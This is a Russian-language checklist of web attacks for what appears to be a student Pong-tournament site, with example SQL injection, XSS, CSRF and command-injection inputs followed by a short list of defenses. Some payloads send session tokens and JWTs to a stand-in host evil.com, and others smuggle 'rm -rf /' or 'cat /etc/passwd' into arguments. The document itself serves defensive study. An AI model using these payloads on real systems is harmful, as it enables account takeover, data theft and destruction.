

### Список атак, от которых нужно защищаться
1. **SQL-инъекции**:
   - Классическая SQL-инъекция через формы и API.
   - Слепая SQL-инъекция.
   - Инъекция через поиск, фильтры или турнирные данные.
   - Инъекция через API-запросы (модули Server-Side Pong, CLI).
2. **XSS (межсайтовый скриптинг)**:
   - Отраженный XSS через URL или параметры.
   - Хранимый XSS через профили, чат, имена турниров, аватары.
   - DOM-based XSS через TypeScript SPA.
   - XSS через API-ответы или кастомизацию игры.
3. **Связанные атаки**:
   - CSRF для подделки действий пользователя.
   - Небезопасная обработка ввода (формы, API, CLI, чат).
   - Атаки на API (манипуляция запросами).
   - Атаки на блокчейн (внедрение вредоносных данных).
   - Атаки на сессии (кража куки или JWT через XSS).
   - Атаки на чат (спам, вредоносные ссылки).
   - Атаки через CLI (инъекции в API).

---


#### **1. SQL-инъекции**  
**Классическая SQL-инъекция**  
```sql
-- Ввод в поле логина: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...';
```
**Слепая SQL-инъекция**  
```sql
-- Ввод: ' AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--
SELECT * FROM tournaments WHERE id = '1' AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--';
```
**Инъекция через поиск/фильтры**  
```sql
-- Ввод в поиск: ' UNION SELECT username, password FROM users--
SELECT * FROM games WHERE name LIKE '%' UNION SELECT username, password FROM users--%';
```
**Инъекция через API (Server-Side Pong)**  
```http
GET /api/game?id=1; DROP TABLE scores--
```

---

#### **2. XSS (межсайтовый скриптинг)**  
**Отраженный XSS (через URL)**  
```http
https://example.com/search?q=<script>alert('XSS')</script>
```
**Хранимый XSS (чат, профиль)**  
```javascript
// Ввод в чат:
<img src=x onerror="fetch('/steal-cookie?cookie='+document.cookie)">
```
**DOM-based XSS (SPA-приложение)**  
```javascript
// Ввод в поле:
"><svg onload="location.href='https://evil.com?data='+localStorage.token">
```
**XSS через API (кастомизация игры)**  
```json
{
  "gameSettings": "<script>alert('XSS')</script>"
}
```

---

#### **3. Связанные атаки**  
**CSRF (подделка действий)**  
```html
<!-- На другом сайте: -->
<form action="https://your-site.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="hacker">
</form>
<script>document.forms[0].submit();</script>
```
**Небезопасная обработка ввода (CLI)**  
```bash
# Ввод в CLI:
game --join-tournament '1; rm -rf /'
```
**Атака на API (манипуляция запросами)**  
```http
PATCH /api/user/1 HTTP/1.1
{"role": "admin"}
```
**Атака на блокчейн (вредоносный контракт)**  
```solidity
// Ввод в смарт-контракт:
function withdraw() public {
    payable(msg.sender).transfer(address(this).balance);
}
```
**Кража сессии (через XSS)**  
```javascript
// Вставка в чат:
fetch('https://evil.com/log?token=' + localStorage.getItem('jwt'));
```
**Спам/фишинг в чате**  
```
Привет! Перейди по ссылке: http://fake-login.com?site=yoursite.com
```
**Атака через CLI (инъекция в API)**  
```bash
curl -X POST "https://api.example.com/game" -d '{"command":"start; cat /etc/passwd"}'
```

---

### **Вывод**  
Эти примеры показывают, как злоумышленник может эксплуатировать уязвимости.  
**Защита:**  
- **SQL-инъекции** → Параметризованные запросы, ORM.  
- **XSS** → Экранирование, CSP, `DOMPurify`.  
- **CSRF** → Токены, проверка `Origin`.  
- **CLI/API-атаки** → Валидация ввода, санитизация.  
- **Блокчейн** → Аудит смарт-контрактов.  
- **Чат** → Фильтрация HTML, ограничение ссылок.  

💥☄️ 💥☄️ 💥☄️ Минимизировать использование `eval()`, `innerHTML`, конкатенации SQL и сырых API-запросов!!!!!! 💥☄️ 💥☄️ 💥☄️
